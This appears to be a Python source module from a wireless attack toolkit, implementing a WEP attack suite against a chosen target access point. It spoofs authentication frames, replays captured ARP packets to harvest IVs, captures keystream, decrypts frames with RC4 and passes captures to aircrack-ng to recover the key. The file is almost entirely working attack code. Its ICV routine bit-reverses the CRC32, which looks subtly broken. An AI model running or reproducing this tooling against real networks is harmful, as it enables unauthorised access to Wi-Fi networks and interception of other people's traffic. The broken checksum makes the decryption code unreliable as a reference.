"""
WEP attack suite (legacy 802.11).

  * Fake authentication      - associate with the AP without a key
  * ARP request replay       - inject captured ARP to generate IV traffic
  * PRGA keystream capture   - grab the XOR keystream for later injection
  * WEP decrypt (known key)  - pure-Python RC4 decryption of data frames
  * aircrack-ng bridge       - hand the IV-rich capture to aircrack for cracking

For modern networks use Analysis -> handshake/PMKID instead.
"""
import random
import threading
import time
import zlib

from open80211.core import ui
from open80211.core.config import CONFIG, check_platform
from open80211.core import netutils as nu
from open80211.core.interfaces import set_channel

try:
    from scapy.all import sendp, sniff, wrpcap, RadioTap, Dot11, Dot11Auth, \
        Dot11AssoReq, Dot11Elt, Dot11WEP, Dot11Data, Dot11, LLC, SNAP
    from scapy.layers.l2 import LLC, SNAP
except Exception:
    pass


def _rc4(key: bytes, data: bytes) -> bytes:
    """Pure-Python RC4."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def wep_decrypt(iv: bytes, key: bytes, ciphertext: bytes) -> tuple:
    """Decrypt a WEP payload (ciphertext includes 4-byte ICV). Returns (plain, ok)."""
    keystream = _rc4(iv + key, ciphertext)
    if len(keystream) < 4:
        return b"", False
    plain = keystream[:-4]
    icv = keystream[-4:]
    expected = struct_crc32(plain)
    ok = icv == expected
    return plain, ok


def struct_crc32(data: bytes) -> bytes:
    """WEP ICV: bit-reversed CRC32, little-endian."""
    crc = zlib.crc32(data) & 0xFFFFFFFF
    rev = 0
    for _ in range(32):
        rev = (rev << 1) | (crc & 1)
        crc >>= 1
    return rev.to_bytes(4, "little")


def fake_auth(iface: str, bssid: str, client_mac: str = "", attempts: int = 5) -> None:
    """Authenticate a spoofed client to the AP (required before injection)."""
    if not check_platform("linux"):
        return
    ui.section("WEP Fake Authentication", f"AP={bssid}")
    bssid = nu.norm_mac(bssid)
    client = nu.norm_mac(client_mac) if client_mac else nu.int2mac(random.getrandbits(48))
    ui.info(f"Associating {client} ...")
    try:
        for seq in range(1, attempts + 1):
            auth = RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2=client,
                                      addr3=bssid) / Dot11Auth(seqnum=seq, status=0)
            sendp(auth, iface=iface, verbose=False)
            time.sleep(0.2)
        assoc = RadioTap() / Dot11(type=0, subtype=0, addr1=bssid, addr2=client,
                                   addr3=bssid) / \
            Dot11AssoReq() / Dot11Elt(ID=0, info=b"") / Dot11Elt(ID=1, info=b"\x04")
        sendp(assoc, iface=iface, verbose=False)
        ui.ok(f"Fake client {client} sent auth+assoc. Use this MAC for replay.")
    except Exception as e:
        ui.error(str(e))


def arp_replay(iface: str, bssid: str, client_mac: str, duration: float = 60.0) -> str:
    """
    Capture an ARP packet, then replay it to generate new IVs.
    Returns the IV-rich pcap path.
    """
    if not check_platform("linux"):
        return ""
    ui.section("WEP ARP Replay", f"AP={bssid} client={client_mac}")
    bssid = nu.norm_mac(bssid)
    client = nu.norm_mac(client_mac)
    iv_pkts = []
    arp_pkt = None
    stop = threading.Event()
    outfile = CONFIG.save(f"wep-ivs-{bssid.replace(':', '')}", {}, "pcap")

    def grab(pkt):
        nonlocal arp_pkt
        if not pkt.haslayer(Dot11):
            return
        d = pkt.getlayer(Dot11)
        if d.type == 2 and pkt.haslayer(LLC) and pkt.haslayer(SNAP):
            if getattr(pkt[SNAP], "code", 0) == 0x0806:
                if arp_pkt is None:
                    arp_pkt = pkt
                    ui.ok("Captured ARP packet. Replaying...")
        if d.type == 2 and pkt.haslayer(Dot11WEP):
            iv_pkts.append(pkt)

    def replay():
        nonlocal arp_pkt
        while not stop.is_set():
            if arp_pkt is not None:
                try:
                    sendp(arp_pkt, iface=iface, verbose=False)
                except Exception:
                    pass
            time.sleep(0.1)

    t = threading.Thread(target=replay, daemon=True)
    t.start()
    ui.info(f"Collecting IVs for {int(duration)}s...")
    try:
        sniff(iface=iface, prn=grab, store=False, timeout=duration)
    except KeyboardInterrupt:
        pass
    stop.set()
    wrpcap(str(outfile), iv_pkts)
    ui.ok(f"Captured {len(iv_pkts)} IV packets -> {outfile}")
    return str(outfile)


def capture_prga(iface: str, bssid: str, duration: float = 30.0) -> str:
    """Capture WEP keystream (PRGA) frames for packet injection."""
    if not check_platform("linux"):
        return ""
    ui.section("PRGA Keystream Capture", f"AP={bssid}")
    bssid = nu.norm_mac(bssid)
    frames = []
    seen = set()

    def grab(pkt):
        if pkt.haslayer(Dot11WEP):
            key = bytes(pkt[Dot11WEP].iv + pkt[Dot11WEP].wepdata)
            if key not in seen:
                seen.add(key)
                frames.append(pkt)

    ui.info("Listening for WEP data... (wait for client traffic)")
    try:
        sniff(iface=iface, prn=grab, store=False, timeout=duration)
    except KeyboardInterrupt:
        pass
    p = CONFIG.save(f"prga-{bssid.replace(':', '')}", {}, "pcap")
    wrpcap(str(p), frames)
    ui.ok(f"Captured {len(frames)} PRGA frames -> {p}")
    return str(p)


def decrypt_capture(pcap_path: str, key_hex: str, bssid: str = "") -> list:
    """Decrypt all WEP data frames in a pcap with a known hex key."""
    from scapy.all import rdpcap
    ui.section("WEP Decrypt", f"pcap={pcap_path}")
    key = bytes.fromhex(key_hex.replace(":", "").replace("-", ""))
    out = []
    try:
        pkts = rdpcap(pcap_path)
    except Exception as e:
        ui.error(str(e))
        return []
    for pkt in pkts:
        if not pkt.haslayer(Dot11WEP):
            continue
        w = pkt.getlayer(Dot11WEP)
        plain, ok = wep_decrypt(w.iv, key, bytes(w.wepdata))
        if ok:
            d = pkt.getlayer(Dot11)
            out.append({"src": d.addr2, "dst": d.addr1,
                        "iv": w.iv.hex(), "plain": plain.hex(),
                        "text": plain.decode(errors="replace")[:80]})
            ui.info(f"  {d.addr2} -> {d.addr1} iv={w.iv.hex()} {plain[:40]!r}")
    ui.ok(f"Decrypted {len(out)} frames.")
    return out


def crack_with_aircrack(pcap_path: str, bssid: str = "") -> None:
    from open80211.core.interfaces import which, system_command
    if not which("aircrack-ng"):
        ui.warn("aircrack-ng not installed.")
        return
    ui.section("aircrack-ng", f"capture={pcap_path}")
    cmd = f"aircrack-ng -b {bssid} {pcap_path}" if bssid else f"aircrack-ng {pcap_path}"
    rc, out = system_command(cmd, timeout=600)
    ui.info(out[-2500:])
    if "KEY FOUND" in out:
        ui.ok("WEP key recovered.")


def wep_menu(iface: str) -> None:
    while True:
        choice = ui.menu("WEP Suite (legacy)", [
            "Fake authentication",
            "ARP replay + IV capture",
            "PRGA keystream capture",
            "Decrypt capture with known key",
            "Crack with aircrack-ng",
        ])
        if choice == 0:
            return
        if not check_platform("linux"):
            continue
        if choice == 1:
            bssid = ui.ask("Target AP BSSID")
            client = ui.ask("Client MAC (blank = random)", default="")
            fake_auth(iface, bssid, client)
        elif choice == 2:
            bssid = ui.ask("Target AP BSSID")
            client = ui.ask("Fake client MAC (from fake auth)", default="")
            dur = ui.ask_int("Duration (s)", default=60)
            if not client:
                ui.warn("Run Fake authentication first and use its MAC.")
            arp_replay(iface, bssid, client, dur)
        elif choice == 3:
            bssid = ui.ask("Target AP BSSID")
            dur = ui.ask_int("Duration (s)", default=30)
            capture_prga(iface, bssid, dur)
        elif choice == 4:
            pcap = ui.ask("Capture path", default=str(CONFIG.session_dir))
            key = ui.ask("WEP key hex (10 or 26 chars)")
            decrypt_capture(pcap, key)
        elif choice == 5:
            pcap = ui.ask("IV capture path", default=str(CONFIG.session_dir))
            bssid = ui.ask("BSSID (optional)", default="")
            crack_with_aircrack(pcap, bssid)